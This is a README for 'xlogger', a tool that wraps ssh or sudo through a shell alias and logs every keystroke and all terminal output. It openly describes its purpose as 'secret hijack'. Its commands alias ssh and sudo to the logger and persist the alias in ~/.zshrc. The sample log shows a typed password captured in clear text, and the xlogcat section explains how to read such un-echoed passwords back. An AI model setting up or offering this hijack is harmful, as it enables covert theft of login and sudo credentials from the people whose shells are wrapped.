# xlogger

记录目标程序的所有键盘输入和终端输出日志。

You know, For secret hijack。

## 编译

```bash
make
```

## 用法

### 劫持 SSH

```bash
export XPROGRAM="/usr/bin/ssh"
export XLOGFILE="$HOME/ssh_logger.log"
alias ssh='/path/to/xlogger'
ssh root@server.example.com
```

### 劫持 Sudo

```bash
export XPROGRAM="/usr/bin/sudo"
export XLOGFILE="$HOME/sudo_logger.log"
alias sudo='/path/to/xlogger'
sudo -s
```

### 写入 ~/.zshrc 持久化

```bash
# xlogger: wrap ssh to log keyboard input and console output
export XPROGRAM="/usr/bin/ssh"
export XLOGFILE="$HOME/ssh_logger.log"
export XLOGINPUT=1
export XLOGOUTPUT=1
alias ssh='/path/to/xlogger'
```

## 环境变量

所有配置通过环境变量在运行时控制，无需重新编译：

| 环境变量 | 说明 | 默认值 |
|---|---|---|
| `XPROGRAM` | 被包装的目标程序路径 | `/usr/bin/sudo` |
| `XLOGFILE` | 日志文件路径 | `.xlogger.log` |
| `XLOGINPUT` | 是否记录键盘输入（`1`=是，`0`=否） | `1` |
| `XLOGOUTPUT` | 是否记录终端输出（`1`=是，`0`=否） | `1` |

### 示例

```bash
# 只记录键盘输入，不记录终端输出
export XLOGINPUT=1
export XLOGOUTPUT=0

# 只记录终端输出，不记录键盘输入
export XLOGINPUT=0
export XLOGOUTPUT=1

# 自定义日志路径
export XLOGFILE="/var/log/ssh_audit.log"
```

## 日志格式

日志保存在 `XLOGFILE` 指定的文件中（默认 `.xlogger.log`），格式如下：

```

=== New session started: /usr/bin/ssh ===
Arg[1]: root@server.example.com
=====================================
[2026-07-14 10:30:15] INPUT: root@server.example.com
[2026-07-14 10:30:16] OUTPUT: Password: 
[2026-07-14 10:30:20] INPUT: my-secret-password
=== Session ended with status: 0 ===

```

- 每行带时间戳
- `INPUT` 记录键盘输入，`OUTPUT` 记录终端输出
- 不可打印字符以 `\xNN`、`\t`、`\n`、`\r` 等形式转义
- 每个会话以 `=== New session started ===` 开始，`=== Session ended ===` 结束

## 阅读日志 (xlogcat)

`xlogcat` 用于解码并阅读 xlogger 产生的日志。

```bash
xlogcat <logfile>                   # 默认: 终端回放，还原原终端屏幕上的输出效果
xlogcat <logfile> --ansi            # 终端回放，保留 ANSI 颜色/控制码(完全保真)
xlogcat <logfile> --input           # 只看 INPUT 行(键盘输入，含退格还原)
xlogcat <logfile> --output          # 只看 OUTPUT 行
xlogcat <logfile> --input --output  # 同时看 INPUT 和 OUTPUT(审计视图)
xlogcat <logfile> --time            # 审计视图下显示时间戳
xlogcat <logfile> --raw             # 原样输出，不做任何解码
```

- **默认(回放)**：仅还原 `OUTPUT` 流，即原终端里真正看到的内容。解码 `\xNN \n \r \t`、
  剥离 ANSI 控制码、去掉多余 `\r`、按真实换行输出，不带任何前缀，效果与原终端一致。
  `INPUT` 行(键盘输入)在回放中跳过——它与 `OUTPUT` 里的按键回显重复；如需查看未回显的
  输入(例如密码)，请使用 `--input`。
- **`--ansi`**：同回放，但保留 ANSI 颜色/光标码与 `\r`，让阅读终端像原终端一样渲染
  (注意：清屏等控制码也会生效)。
- **`--input` / `--output`**：审计视图，每条日志占一行，仅解码 `\xNN` 并剥离 ANSI，
  `\n \r \t` 保留为字面量以便 grep。
- **`--raw`**：原样打印日志每一行。
